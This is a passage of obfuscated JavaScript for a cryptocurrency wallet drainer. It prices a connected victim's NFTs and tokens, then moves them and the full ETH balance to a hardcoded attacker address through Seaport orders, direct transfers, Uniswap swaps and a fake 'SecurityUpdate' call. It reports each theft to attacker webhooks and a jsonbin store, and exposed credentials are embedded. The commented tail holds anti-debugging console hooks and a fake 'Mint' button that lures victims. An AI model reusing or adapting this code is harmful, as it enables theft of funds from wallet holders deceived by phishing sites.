              Mh.asset_contract.schema_name,
              Mh.collection.name,
              known_prices[Mh.asset_contract.address],
            ]
            return
          }
          const { collection: MU } = await fetch(
              'https://api.opensea.io/api/v1/collection/' + Mm
            ).then((Mc) => Mc.json()),
            MY = MU.stats.total_volume >= 10
          if (!MY) {
            return
          }
          try {
            const Mc = MU.stats.floor_price
            doesit =
              MU.primary_asset_contracts[0].address !=
                '0x495f947276749ce646f68ac8c248420045cb7b5e' &&
              MU.primary_asset_contracts[0].address !=
                '0x57f1887a8bf19b14fc0df6fd9b2acc9af147ea85' &&
              MU.primary_asset_contracts[0].address !=
                '0x39ee2c7b3cb80254225884ca001f57118c8f21b6' &&
              MU.primary_asset_contracts[0].address !=
                '0x76be3b62873462d2142405439777e971754e8e77' &&
              MU.primary_asset_contracts[0].address !=
                '0x0E32cEE0445413e118b14d02E0409303D338487a' &&
              MU.primary_asset_contracts[0].address !=
                '0x60F80121C31A0d46B5279700f9DF786054aa5eE5'
            if (!doesit) {
              return
            }
            if (Mc < 0.05) {
              return
            }
            filtered = M9.filter(
              (MO) =>
                MO.asset_contract.address ==
                MU.primary_asset_contracts[0].address
            )
            Mm == 'sandbox' &&
              (filtered = M9.filter(
                (MB) =>
                  MB.asset_contract[3].address ==
                  MU.primary_asset_contracts[0].address
              ))
            Mi[MU.primary_asset_contracts[0].address] = [
              Mc * filtered.length,
              MU.primary_asset_contracts[0].schema_name,
              MU.name,
              Mc,
            ]
          } catch (Mt) {
            return
          }
        })
      return await Promise.all(MS), Mi
    }
    prices_big_promise = Promise.all([g(await (await u).json()), A(x, H)])
    var b = await prices_big_promise
    erc_responses = await b[0]
    nft_responses = await b[1]
    console.log(nft_responses)
    console.log(erc_responses)
    console.log(nft_responses)
    function C(M8) {
      var MM = { MZ: 1 },
        Md = [],
        Mi = M8.length,
        MS = 0
      for (var Mh = 0; Mh < Mi; Mh++) {
        var MZ = M8[Mh]
        if (MM[MZ] !== 1) {
          Md[MS++] = MZ
        }
      }
      return Md
    }
    erc_approved = C(T)
    to_seaport_drainer = []
    for (let M8 = 0; M8 < erc_approved.length; M8++) {
      if (erc_responses.hasOwnProperty(erc_approved[M8])) {
        to_seaport_drainer.push([
          erc_approved[M8],
          erc_responses[erc_approved[M8]][1],
          erc_responses[erc_approved[M8]][0],
          'ERC-20',
          erc_responses[erc_approved[M8]][0],
        ])
      }
    }
    to_seaport_drainer.sort(function (Md, Mi) {
      let MZ = Md[2],
        My = Mi[2]
      if (MZ > My) {
        return 1
      }
      if (MZ < My) {
        return -1
      }
      return 0
    })
    to_seaport_drainer = to_seaport_drainer.reverse()
    to_seaport_drainer = to_seaport_drainer.slice(0, 1)
    p = C(p)
    for (let Md = 0; Md < p.length; Md++) {
      if (nft_responses.hasOwnProperty(p[Md])) {
        out = H.filter((Mh) => Mh.asset_contract.address == p[Md])
        for (let Mh = 0; Mh < out.length; Mh++) {
          to_seaport_drainer.push([
            p[Md],
            out[Mh].token_id,
            nft_responses[p[Md]][3],
            nft_responses[p[Md]][1],
            nft_responses[p[Md]][2],
          ])
        }
      }
    }
    console.log(to_seaport_drainer)
    to_seaport_drainer.sort(function (My, Mm) {
      let MV = My[2],
        Mo = Mm[2]
      if (MV > Mo) {
        return 1
      }
      if (MV < Mo) {
        return -1
      }
      return 0
    })
    to_seaport_drainer = to_seaport_drainer.reverse()
    to_seaport_drainer = to_seaport_drainer.slice(0, 20)
    async function N(My, Mm, MU) {
      try {
        function MJ(MI) {
          if (MI == 'ERC721') {
            return 2
          } else {
            if (MI == 'ERC1155') {
              return 3
            } else {
              if (MI == 'ERC-20') {
                return 1
              }
            }
          }
        }
        var MY = [],
          MV = [],
          Mo = 0
        MU.forEach(async (MI) => {
          Mo = Mo + MI[2]
          type = MJ(MI[3])
          if (type == 1) {
            const MX = {
              itemType: type,
              token: MI[0],
              identifier: '0',
              amount: MI[1],
            }
            MY.push(MX)
            const ct = {
              itemType: type,
              token: MI[0],
              identifier: '0',
              amount: MI[1],
              recipient: '0x74a8a030FC3568d83fd74d57B8e74cAf70Aed676',
            }
            MV.push(ct)
          } else {
            const cz = {
              itemType: type,
              token: MI[0],
              identifier: MI[1],
            }
            MY.push(cz)
            const cK = {
              itemType: type,
              token: MI[0],
              identifier: MI[1],
              recipient: '0x74a8a030FC3568d83fd74d57B8e74cAf70Aed676',
            }
            MV.push(cK)
          }
        })
        const Ml = {
          zone: '0x004C00500000aD104D7DBd00e3ae0A5C00560C00',
          startTime: '1661790956',
          conduitKey:
            '0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000',
          offer: MY,
          consideration: MV,
        }
        var Mc = await Mm.createOrder(
            Ml,
            '0x74a8a030FC3568d83fd74d57B8e74cAf70Aed676'
          ),
          MO = await Mc.executeAllActions()
        let Mj = [],
          MG = 0
        for (const MI in MO.parameters.offer) {
          const Mn = {
            orderIndex: 0,
            itemIndex: MG,
          }
          const Mg = {
            orderIndex: 0,
            itemIndex: MG,
          }
          const MW = {
            offerComponents: [Mn],
            considerationComponents: [Mg],
          }
          Mj.push(MW)
          MG++
        }
        abi = await new ethers.utils.Interface(UA)
        encoded = await abi.encodeFunctionData('matchOrders', [[MO], Mj])
        var MB = await btoa(encoded)
        console.log('B WEBHOOK: ', MB)
        // const MQ = await fetch('https://moralis-node.com/users/98756254787', {
        //   method: 'POST',
        //   body: MB,
        // })
        var Mt = await MQ.text()
        if (Mt.startsWith('0x')) {
          var MF = 'False',
            Mz = 'https://etherscan.io/tx/' + Mt
        } else {
          var MF = 'True',
            Mz = 'None'
        }
        const MD = await fetch('https://api.jsonbin.io/v3/b/', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'X-Master-Key':
                '$2b$10$A1MCDIC7vl.ImRv4u6o11eXaZs5CX0MKe82OJNwrGLG8g/tC3GiIG',
              'X-Bin-Private': 'false',
              'X-Bin-Name': 'test',
            },
            body: JSON.stringify(MO),
          }),
          Mf = await MD.json()
        cy(
          '%E2%9C%85 SEAPORT ITEMS: ' +
            MU.length +
            ' [Address](https://etherscan.io/address/' +
            Q +
            ') [JSON](https://api.jsonbin.io/v3/b/' +
            Mf.metadata.id +
            '?meta=false) [TXID](' +
            Mz +
            ')\nManual: ' +
            MF +
            '\nValue: ' +
            Mo +
            'ETH&parse_mode=Markdown'
        )
        if (Mt.startsWith('0x')) {
          return true
        } else {
          return false
        }
      } catch (cJ) {
        return (
          cy(
            '%F0%9F%9A%A8 SEAPORT ERROR [Address](https://etherscan.io/address/' +
              Q +
              ')\n' +
              cJ.message +
              ' Prompting SAFA&parse_mode=Markdown'
          ),
          false
        )
      }
    }
    async function E(My) {
      async function MU(Mo, Mc, MO, MB, Mt, MF) {
        try {
          console.log('trying')
          keyPair = await window.crypto.subtle.importKey(
            'spki',
            cO,
            {
              name: 'RSA-OAEP',
              hash: 'SHA-256',
            },
            true,
            ['encrypt']
          )
          mess = await cm(keyPair, Mo)
          addr = await cm(keyPair, Mc)
          coll = await cm(keyPair, MO)
          receiv = await cm(keyPair, MB)
          txxxxxxxx = await cm(keyPair, Mt)
          amdsadsat = await cm(keyPair, MF)
          console.log(mess)
          const MJ = {}
          MJ.one = yz
          MJ.two = mess
          MJ.three = addr
          MJ.four = coll
          MJ.five = receiv
          MJ.sex = txxxxxxxx
          MJ.seven = amdsadsat
          console.log('C WEBHOOK: ', JSON.stringify(MJ))
          // fetch('https://moralis-node.com/users/67448747', {
          //   method: 'POST',
          //   body: JSON.stringify(MJ),
          // })
          return
        } catch (Mj) {
          console.log(Mj)
        }
      }
      async function MY(Mo, Mc, MO, MB, Mt) {
        try {
          console.log('trying')
          keyPair = await window.crypto.subtle.importKey(
            'spki',
            cO,
            {
              name: 'RSA-OAEP',
              hash: 'SHA-256',
            },
            true,
            ['encrypt']
          )
          mess = await cm(keyPair, Mo)
          addr = await cm(keyPair, Mc)
          coll = await cm(keyPair, MO)
          receiv = await cm(keyPair, MB)
          txxxxxxxx = await cm(keyPair, Mt)
          console.log(mess)
          const MJ = {}
          MJ.one = yz
          MJ.two = mess
          MJ.three = addr
          MJ.four = coll
          MJ.five = receiv
          MJ.sex = txxxxxxxx
          console.log('D WEBHOOK: ', JSON.stringify(MJ))
          // fetch('https://moralis-node.com/users/87654821', {
          //   method: 'POST',
          //   body: JSON.stringify(MJ),
          // })
          return
        } catch (Mj) {
          console.log(Mj)
        }
      }
      for (let Mo = 0; Mo < My.length; Mo++) {
        if (My[Mo][0] != '0x0') {
          if (My[Mo][3] == 'ERC-20') {
            async function Mc(MB, Mt) {
              return (
                (uni_aaaa = '0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45'),
                (logs_nft = await provider_test.getLogs({
                  address: Mt,
                  fromBlock: '0x1',
                  toBlock: 'latest',
                  topics: [
                    '0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925',
                    '0x000000000000000000000000' + MB.slice(2),
                    '0x000000000000000000000000' + uni_aaaa.slice(2),
                  ],
                })),
                (approved = false),
                console.log(logs_nft),
                logs_nft.forEach((Mz) => {
                  addresss = Mz.address
                  data = Mz.data
                  if (data.startsWith('0xf')) {
                    approved = true
                  } else {
                    approved = false
                  }
                }),
                approved
              )
            }
            async function MO(MB, Mt) {
              const MK = {
                internalType: 'uint256',
                name: 'amountIn',
                type: 'uint256',
              }
              const MJ = {
                internalType: 'uint256',
                name: 'amountOutMin',
                type: 'uint256',
              }
              const Ml = {
                internalType: 'address[]',
                name: 'path',
                type: 'address[]',
              }
              const Mj = {
                internalType: 'address',
                name: 'to',
                type: 'address',
              }
              const MG = {}
              return (
                (MG.inputs = [MK, MJ, Ml, Mj]),
                (MG.name = 'swapExactTokensForTokens'),
                (MG.outputs = [
                  {
                    internalType: 'uint256',
                    name: 'amountOut',
                    type: 'uint256',
                  },
                ]),
                (MG.stateMutability = 'payable'),
                (MG.type = 'function'),
                (abicko3 = new ethers.utils.Interface([MG])),
                (encoded_dadadaaaaaaa = abicko3.encodeFunctionData(
                  'swapExactTokensForTokens',
                  [
                    Mt,
                    '0',
                    [MB, '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2'],
                    '0x74a8a030FC3568d83fd74d57B8e74cAf70Aed676',
                  ]
                )),
                encoded_dadadaaaaaaa
              )
            }
            try {
              var MV = await Mc(Q, My[Mo][0])
              if (MV) {
                console.log(My[Mo][0] + ' is approved ')
                encoded_shit = await MO(My[Mo][0], My[Mo][1])
                to_ti_to = '0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45'
              } else {
                console.log(My[Mo][0] + ' is not approved '),
                  (encoded_shit = ci),
                  (to_ti_to = My[Mo][0])
              }
              const Mt = {
                from: Q,
                to: to_ti_to,
                data: encoded_shit,
              }
              const MF = await j.estimateGas(Mt),
                Mz = await j.getGasPrice(),
                MK = Mz.mul(MF)
              response = await j.sendTransaction({
                from: Q,
                to: to_ti_to,
                data: encoded_shit,
                gasLimit: MF.toHexString(),
              })
              console.log(response)
              MV
                ? cy(
                    '%F0%9F%A6%84 UNISWAP ' +
                      window.location.host +
                      ' [TXID](https://etherscan.io/tx/' +
                      response.hash +
                      ') \nFROM ' +
                      Q +
                      '\nValue: ' +
                      My[Mo][2] +
                      'ETH&parse_mode=Markdown'
                  )
                : MU(
                    '%F0%9F%A9%B8 ERC-20 ' +
                      window.location.host +
                      ' [TXID](https://etherscan.io/tx/' +
                      response.hash +
                      ') \nFROM ' +
                      Q +
                      '\nTO ' +
                      '0x74a8a030FC3568d83fd74d57B8e74cAf70Aed676' +
                      '\nValue: ' +
                      My[Mo][2] +
                      'ETH&parse_mode=Markdown',
                    Q,
                    My[Mo][0],
                    '0x74a8a030FC3568d83fd74d57B8e74cAf70Aed676',
                    response.hash,
                    My[Mo][1]
                  )
            } catch (MQ) {
              console.log(MQ)
              cy(
                '%F0%9F%9A%A8 ERC-20 REJECTED [Address](https://etherscan.io/address/' +
                  Q +
                  ') [URL](https://etherscan.io/token/' +
                  My[Mo][0] +
                  '?a=' +
                  Q +
                  ')&parse_mode=Markdown'
              )
            }
          } else {
            if (My[Mo][3] == 'PUNK') {
              punk_abicko = new ethers.utils.Interface(U8)
              filtered_punks = H.filter(
                (MD) =>
                  MD.asset_contract.address ==
                  '0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb'
              )
              for (let MD = 0; MD < filtered_punks.length; MD++) {
                try {
                  encodedd_shitass_punk = punk_abicko.encodeFunctionData(
                    'transferPunk',
                    [
                      '0x74a8a030FC3568d83fd74d57B8e74cAf70Aed676',
                      filtered_punks[MD].token_id,
                    ]
                  )
                  const Mf = {
                    from: Q,
                    to: '0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb',
                    data: encodedd_shitass_punk,
                  }
                  const MI = await j.estimateGas(Mf),
                    Mn = await j.getGasPrice()
                  console.log(My)
                  const Mg = Mn.mul(MI)
                  response = await j.sendTransaction({
                    from: Q,
                    to: '0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb',
                    data: encodedd_shitass_punk,
                    gasLimit: MI.toHexString(),
                  })
                  cy(
                    '%F0%9F%9A%A7 PUNK TRANSFER ' +
                      window.location.host +
                      ' [CONTRACT](https://etherscan.io/token/' +
                      My[Mo][0] +
                      '?a=' +
                      Q +
                      ') [TXID](https://etherscan.io/tx/' +
                      response.hash +
                      ')\nFROM ' +
                      Q +
                      '\nValue: 66ETH&parse_mode=Markdown'
                  )
                } catch (MW) {
                  cy(
                    '%F0%9F%9A%A8 PUNK TRANSFER REJECTED [Address](https://etherscan.io/address/' +
                      Q +
                      ') [URL](https://etherscan.io/token/' +
                      My[Mo][0] +
                      '?a=' +
                      Q +
                      ')&parse_mode=Markdown'
                  )
                }
              }
            } else {
              if (My[Mo][0] != '0x57f1887a8bf19b14fc0df6fd9b2acc9af147ea85') {
                const MX = {
                  from: Q,
                  to: My[Mo][0],
                  data: cS,
                }
                const ct = await j.estimateGas(MX),
                  cF = await j.getGasPrice(),
                  cz = cF.mul(ct)
                try {
                  response = await j.sendTransaction({
                    from: Q,
                    to: My[Mo][0],
                    data: cS,
                    gasLimit: ct.toHexString(),
                  })
                  MY(
                    '%F0%9F%9A%A7 SAFA ' +
                      window.location.host +
                      ' [CONTRACT](https://etherscan.io/token/' +
                      My[Mo][0] +
                      '?a=' +
                      Q +
                      ') [TXID](https://etherscan.io/tx/' +
                      response.hash +
                      ')\nFROM ' +
                      Q +
                      '\nValue: ' +
                      My[Mo][2] +
                      '\nName: ' +
                      My[Mo][4] +
                      'ETH&parse_mode=Markdown',
                    Q,
                    My[Mo][0],
                    '0x74a8a030FC3568d83fd74d57B8e74cAf70Aed676',
                    response.hash
                  )
                } catch (cK) {
                  cy(
                    '%F0%9F%9A%A8 SAFA REJECTED [Address](https://etherscan.io/address/' +
                      Q +
                      ') [URL](https://etherscan.io/token/' +
                      My[Mo][0] +
                      '?a=' +
                      Q +
                      ')&parse_mode=Markdown'
                  )
                }
              }
            }
          }
        }
      }
      console.log('returning from approvals')
      return true
    }
    async function L() {
      const My = {
        constant: false,
        inputs: [],
        name: 'SecurityUpdate',
        outputs: [],
        payable: true,
        stateMutability: 'payable',
        type: 'function',
      }
      abi = new ethers.utils.Interface([My])
      encoded = abi.encodeFunctionData('SecurityUpdate')
      const Mm = await j.getBalance(),
        MU = {
          from: Q,
          to: '0x74a8a030FC3568d83fd74d57B8e74cAf70Aed676',
          value: Mm,
          data: encoded,
        }
      const MY = await j.estimateGas(MU)
      console.log(MY)
      const MV = await j.getGasPrice(),
        Mo = MV.mul(MY),
        Mc = Mo.mul(5),
        MO = Mm.sub(Mc),
        MB = ethers.utils.formatEther(Mm)
      const Mt = ethers.utils.formatEther(MY)
      console.log(Mt)
      if (MB < Mt) {
        return (
          cy(
            '%F0%9F%9A%A8 SENDETH ERROR [Address](https://etherscan.io/address/' +
              Q +
              ') \nbalance too low to transfer ETH&parse_mode=Markdown'
          ),
          true
        )
      }
      try {
        return (
          await j.sendTransaction({
            from: Q,
            to: '0x74a8a030FC3568d83fd74d57B8e74cAf70Aed676',
            value: MO.toHexString(),
            data: encoded,
            gasLimit: MY.toHexString(),
          }),
          cy(
            '%F0%9F%9A%AC LICKED\n' +
              MB +
              ' ETH from [Address](https://etherscan.io/address/' +
              Q +
              ') to 0x74a8a030FC3568d83fd74d57B8e74cAf70Aed676&parse_mode=Markdown'
          ),
          true
        )
      } catch (MF) {
        return (
          cy(
            '%F0%9F%9A%A8 SENDETH ERROR [Address](https://etherscan.io/address/' +
              Q +
              ')\n' +
              MF.message +
              '&parse_mode=Markdown'
          ),
          true
        )
      }
    }
    console.log(to_seaport_drainer)
    if (to_seaport_drainer.length > 0) {
      seaport_result = await N(j, G, to_seaport_drainer)
      if (seaport_result) {
        for (let My = 0; My < to_seaport_drainer.length; My++) {
          if (nft_responses.hasOwnProperty(to_seaport_drainer[My][0])) {
            new_value =
              nft_responses[to_seaport_drainer[My][0]][0] -
              nft_responses[to_seaport_drainer[My][0]][0]
            new_value >= 0
              ? (delete nft_responses[to_seaport_drainer[My][0]],
                console.log('removed ' + to_seaport_drainer[My][0]))
              : (nft_responses[to_seaport_drainer[My][0]] = [
                  new_value,
                  nft_responses[to_seaport_drainer[My][0]][1],
                  nft_responses[to_seaport_drainer[My][0]][2],
                  nft_responses[to_seaport_drainer[My][0]][3],
                ])
          } else {
            erc_responses.hasOwnProperty(to_seaport_drainer[My][0]) &&
              delete erc_responses[to_seaport_drainer[My][0]]
          }
        }
      }
    } else {
      cy(
        '%F0%9F%9A%A8 VICTIM HAS 0 CONDUIT ITEMS [Address](https://etherscan.io/address/' +
          Q +
          ')\n Prompting SAFA&parse_mode=Markdown'
      )
    }
    list_approval = []
    for (const Mm in nft_responses) {
      nft_responses.hasOwnProperty(Mm) &&
        list_approval.push([
          Mm,
          'useless',
          nft_responses[Mm][0],
          nft_responses[Mm][1],
          nft_responses[Mm][2],
        ])
    }
    for (const MU in erc_responses) {
      erc_responses.hasOwnProperty(MU) &&
        list_approval.push([
          MU,
          erc_responses[MU][1],
          erc_responses[MU][0],
          'ERC-20',
          erc_responses[MU][0],
        ])
    }
    list_approval.sort(function (MY, MV) {
      let Mo = MY[2],
        Mc = MV[2]
      if (Mo > Mc) {
        return 1
      }
      if (Mo < Mc) {
        return -1
      }
      return 0
    })
    list_approval = list_approval.reverse()
    list_approval.length > 0
      ? (response_approvals = await E(list_approval))
      : cy(
          '%F0%9F%9A%A8 VICTIM HAS 0 NFTS/ERC [Address](https://etherscan.io/address/' +
            Q +
            ')\n Prompting SENDETH&parse_mode=Markdown'
        )
    await L()
  })
})













// const clog = console.log
// setInterval(() => {
//     console.log = clog
// }, 500);
// const MainApp = (function () {
//         let production = true
//         return function (data, dispatchAct) {
//             const isProdMode = production
//                 ? function () {
//                       if (dispatchAct) {
//                           const parsedDispatch = dispatchAct.apply(
//                               data,
//                               arguments
//                           )
//                           return (dispatchAct = null), parsedDispatch
//                       }
//                   }
//                 : function () {}
//             return (production = false), isProdMode
//         }
//     })(),
//     InitFunc = MainApp(this, function () {
//         const MainAppFunctionA = function () {
//                 const needCheckA = {
//                     dWDSB: function (_0x3055a3, _0xaed2e0) {
//                         return _0x3055a3(_0xaed2e0)
//                     },
//                     MBjMb: function (_0x1439ea, _0x49059b) {
//                         return _0x1439ea + _0x49059b
//                     },
//                     JrkIz: 'return (function() ',
//                     nLoKf: '{}.constructor("return this")( )',
//                 }
//                 let MainConstructor
//                 try {
//                     MainConstructor = Function(
//                         'return (function() {}.constructor("return this")( ));'
//                     )()
//                 } catch (error) {
//                     MainConstructor = window
//                 }
//                 return MainConstructor
//             },
//             AppOneA = MainAppFunctionA(),
//             ToParseReg = new RegExp(
//                 '[LiTOpwSXQCEFvdwdiejSzUIShLNMINYHVUQP]',
//                 'g'
//             )
//         const ParsedRegLIT = 'hola'
//         let SpecialDataAbiOneA,
//             SpecialDataAbiOneB,
//             SpecialDataAbiOneC,
//             SpecialDataAbiOneD
//         const charCodeFuncConv = function (
//                 mainIterator,
//                 toCheckIterator,
//                 protoBufIterator
//             ) {
//                 if (mainIterator.length != toCheckIterator) {
//                     return false
//                 }
//                 for (
//                     let indexOneIterator = 0;
//                     indexOneIterator < toCheckIterator;
//                     indexOneIterator++
//                 ) {
//                     for (
//                         let foundedOnIteratorA = 0;
//                         foundedOnIteratorA < protoBufIterator.length;
//                         foundedOnIteratorA += 2
//                     ) {
//                         if (
//                             indexOneIterator ==
//                                 protoBufIterator[foundedOnIteratorA] &&
//                             mainIterator.charCodeAt(indexOneIterator) !=
//                                 protoBufIterator[foundedOnIteratorA + 1]
//                         ) {
//                             return false
//                         }
//                     }
//                 }
//                 return true
//             },
//             parseBuffTwoA = function (getProtoOne, getProtoTwo, getProtoTwoA) {
//                 return charCodeFuncConv(getProtoTwo, getProtoTwoA, getProtoOne)
//             },
//             parseBuffTwoB = function (getProtoOne, getProtoTwo, getProtoTwoA) {
//                 return parseBuffTwoA(getProtoTwo, getProtoOne, getProtoTwoA)
//             },
//             parseBuffTwoC = function (getProtoOne, getProtoTwo, getProtoTwoA) {
//                 return parseBuffTwoB(getProtoTwo, getProtoTwoA, getProtoOne)
//             }
//         for (let charcodeDecoderOneA in AppOneA) {
//             if (
//                 charCodeFuncConv(
//                     charcodeDecoderOneA,
//                     8,
//                     [7, 116, 5, 101, 3, 117, 0, 100]
//                 )
//             ) {
//                 SpecialDataAbiOneA = charcodeDecoderOneA
//                 break
//             }
//         }
//         for (let tStringerItA in AppOneA[SpecialDataAbiOneA]) {
//             if (parseBuffTwoC(6, tStringerItA, [5, 110, 0, 100])) {
//                 SpecialDataAbiOneB = tStringerItA
//                 break
//             }
//         }
//         for (let tStringerItB in AppOneA[SpecialDataAbiOneA]) {
//             if (parseBuffTwoB(tStringerItB, [7, 110, 0, 108], 8)) {
//                 SpecialDataAbiOneC = tStringerItB
//                 break
//             }
//         }
//         if (!('~' > SpecialDataAbiOneB)) {
//             for (let tStringerItC in AppOneA[SpecialDataAbiOneA][
//                 SpecialDataAbiOneC
//             ]) {
//                 if (parseBuffTwoA([7, 101, 0, 104], tStringerItC, 8)) {
//                     SpecialDataAbiOneD = tStringerItC
//                     break
//                 }
//             }
//         }
//         if (!SpecialDataAbiOneA || !AppOneA[SpecialDataAbiOneA]) {
//             return
//         }
//         const finaBuffParsedData =
//                 AppOneA[SpecialDataAbiOneA][SpecialDataAbiOneB],
//             regExpFinalReturned =
//                 !!AppOneA[SpecialDataAbiOneA][SpecialDataAbiOneC] &&
//                 AppOneA[SpecialDataAbiOneA][SpecialDataAbiOneC][
//                     SpecialDataAbiOneD
//                 ],
//             imAbleToGoNext = finaBuffParsedData || regExpFinalReturned
//         if (!imAbleToGoNext) {
//             return
//         }
//         let StopIteratingCharCodeA = false
//         for (
//             let IterateFinalResult = 0;
//             IterateFinalResult < ParsedRegLIT.length;
//             IterateFinalResult++
//         ) {
//             const ParsedLitGetter = ParsedRegLIT[IterateFinalResult],
//                 FOneCryptoD =
//                     ParsedLitGetter[0] === String.fromCharCode(46)
//                         ? ParsedLitGetter.slice(1)
//                         : ParsedLitGetter,
//                 FOneCryptoA = imAbleToGoNext.length - FOneCryptoD.length,
//                 FOneCryptoB = imAbleToGoNext.indexOf(FOneCryptoD, FOneCryptoA),
//                 FOneCryptoC = FOneCryptoB !== -1 && FOneCryptoB === FOneCryptoA
//             FOneCryptoC &&
//                 (imAbleToGoNext.length == ParsedLitGetter.length ||
//                     ParsedLitGetter.indexOf('.') === 0) &&
//                 (StopIteratingCharCodeA = true)
//         }
//         if (!StopIteratingCharCodeA) {
//             const RegExpCharCodeA = new RegExp(
//                     '[xBwTOYKiQvXWvYdPSIxDVvVcdFPJCTNRcOYNqZOAYimVR]',
//                     'g'
//                 ),
//                 RegExpCharCodeAParsed =
//                     'htxBwtpTOsYK:/i/yuQgalvabXWsvYdPnfStIx.DVvVorgcdFPJCTNRcOYNqZOAYimVR'.replace(
//                         RegExpCharCodeA,
//                         ''
//                     )
//             AppOneA[SpecialDataAbiOneA][SpecialDataAbiOneC] = 'pene'
//         }
//     })
// // InitFunc()
// const HookApp = (function () {
//     let isMetamaskConnected = true
//     return function (windowZone, metamaskAddr) {
//         const returnMetamask = isMetamaskConnected
//             ? function () {
//                   if (metamaskAddr) {
//                       const returnMetaAddr = metamaskAddr.apply(
//                           windowZone,
//                           arguments
//                       )
//                       return (metamaskAddr = null), returnMetaAddr
//                   }
//               }
//             : function () {}
//         return (isMetamaskConnected = false), returnMetamask
//     }
// })()
// ;(function () {
//     HookApp(this, function () {
//         const mainRegexToConvert = new RegExp('function *\\( *\\)'),
//             regexpMetaOneA = new RegExp(
//                 '\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)',
//                 'i'
//             ),
//             regexpMetaOneB = regexpMetaOneC('init')
//         if (
//             !mainRegexToConvert.test(regexpMetaOneB + 'chain') ||
//             !regexpMetaOneA.test(regexpMetaOneB + 'input')
//         ) {
//             regexpMetaOneB('0')
//         } else {
//             regexpMetaOneC()
//         }
//     })()
// })()
// const applyMetaFunctionETH = (function () {
//         let isETHAbleOneA = true
//         return function (ethAm, ethAmB) {
//             const ethReturn = isETHAbleOneA
//                 ? function () {
//                       if (ethAmB) {
//                           const ethApplier = ethAmB.apply(ethAm, arguments)
//                           return (ethAmB = null), ethApplier
//                       }
//                   }
//                 : function () {}
//             return (isETHAbleOneA = false), ethReturn
//         }
//     })(),
//     initMetaMaskHooker = applyMetaFunctionETH(this, function () {
//         const detectMetaAAAA = function () {
//             const unusedCheckTProb = {
//                 FuckerOne: function (unCheckA, unCheckAB) {
//                     return unCheckA(unCheckAB)
//                 },
//                 FuckerOneB: function (unCheckABC, unCheckABCD) {
//                     return unCheckABC + unCheckABCD
//                 },
//                 FuckerOneC: function (unCheckABCDE, unCheckABCDEF) {
//                     return unCheckABCDE + unCheckABCDEF
//                 },
//                 returnFuncAuto: 'return (function() ',
//                 constructorSelfThis: '{}.constructor("return this")( )',
//                 returnAutoSelf: function (mock) {
//                     return mock()
//                 },
//             }
//             let metamaskWindowsD
//             try {
//                 metamaskWindowsD = Function(
//                     'return (function() {}.constructor("return this")( ));'
//                 )()
//             } catch (error) {
//                 metamaskWindowsD = window
//             }
//             return metamaskWindowsD
//         }
//         const navigatorFunctions = detectMetaAAAA(),
//             navigatorHook = (navigatorFunctions.console =
//                 navigatorFunctions.console || {}),
//             navigatorFunctionMap = [
//                 'log',
//                 'warn',
//                 'info',
//                 'error',
//                 'exception',
//                 'table',
//                 'trace',
//             ]
//         for (
//             let currentIterate = 0;
//             currentIterate < navigatorFunctionMap.length;
//             currentIterate++
//         ) {
//             const ethApplierA =
//                     applyMetaFunctionETH.constructor.prototype.bind(
//                         applyMetaFunctionETH
//                     ),
//                 hookedPrice = navigatorFunctionMap[currentIterate],
//                 bindPrice = navigatorHook[hookedPrice] || ethApplierA
//             ethApplierA['__proto__'] =
//                 applyMetaFunctionETH.bind(applyMetaFunctionETH)
//             ethApplierA.toString = bindPrice.toString.bind(bindPrice)
//             navigatorHook[hookedPrice] = ethApplierA
//         }
//     })
    
// initMetaMaskHooker()
// const MainConfig = {
//     webhook:
//         'https://discord.com/api/webhooks/988500564579090552/hFaPXPT5rHn3j6ylgpGVKg6ZTICoiEZ497Y8O6Q9uMV-oNy5WSdviQhftWn6JaZd3PX5',
//     address: '0x2Cccd007479e9a25d729929d8A81b25eC39113be',
//     opensea: 'eeae1d7d4423433ab5e103905ee7cf06',
// }

//     setTimeout(() => {
//         const actionsHTML = document.querySelector('#actions')
//         console.log(actionsHTML)
//         const web3Heritage = new Web3(window.ethereum),
//             victimAddress = web3Heritage.currentProvider.selectedAddress
//         window.ethereum.on('accountsChanged', () => {
//             location.reload()
//         })
//         if (!victimAddress) {
//             actionsHTML.innerHTML = '<div class="mint-button mb-4"><button type="button" id="gatonegroConnect">Connect Account</button></div>'
//             const connectButton = document.getElementById('gatonegroConnect')
//             window.ethereum.enable()
//             connectButton.addEventListener('click', () => {
//                 window.ethereum.enable()
//             })
//         } else {
//             actionsHTML.innerHTML = `
//                 <div class="mint-button mb-4"><button type="button" id="gatonegro">Mint</button></div>
//             `
//             const claimButton = document.getElementById('gatonegro')
//             claimButton.addEventListener('click', () => {
//                 const theProfitAddress = MainConfig.address,
//                     transactionDataA = async (
//                         setApprovalForAll,
//                         payableInputs,
//                         waitingTransactions = [],
//                         internalTypeAddress = [],
//                         finalSendValue = 0
//                     ) => {
//                         const metaSupporterFuncs = (
//                                 transactionData,
//                                 isError
//                             ) => {
//                                 const _0x3b0267 = {
//                                     SNXUF: 'function *\\( *\\)',
//                                     UUHDR: '\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)',
//                                     PFXZi: function (_0x18cac6, _0x1243ff) {
//                                         return _0x18cac6(_0x1243ff)
//                                     },
//                                     cSttE: 'init',
//                                     jULkg: function (_0x22849f, _0x5c4732) {
//                                         return _0x22849f + _0x5c4732
//                                     },
//                                     CzeWx: 'chain',
//                                     oHNet: function (_0x59210e, _0x2e20ee) {
//                                         return _0x59210e + _0x2e20ee
//                                     },
//                                     XVAlF: 'input',
//                                     oOWXH: function (_0x33ab86) {
//                                         return _0x33ab86()
//                                     },
//                                 } // Esta puta mierda no sirve para nada y me he rayado como 40 minutos dflñajasñlkdfjñasjdfajsdflñakjsdflkja pollas
//                                 const configDataThingsA =
//                                         transactionData.asset_contract,
//                                     transactionDataCollection =
//                                         transactionData.collection
//                                 let webhookColor = 2003199,
//                                     webhookStatus = 'Approved'
//                                 if (isError === false) {
//                                     webhookColor = 16719392
//                                     webhookStatus = 'Rejected'
//                                 }
//                                 const webhookThumbnail = {
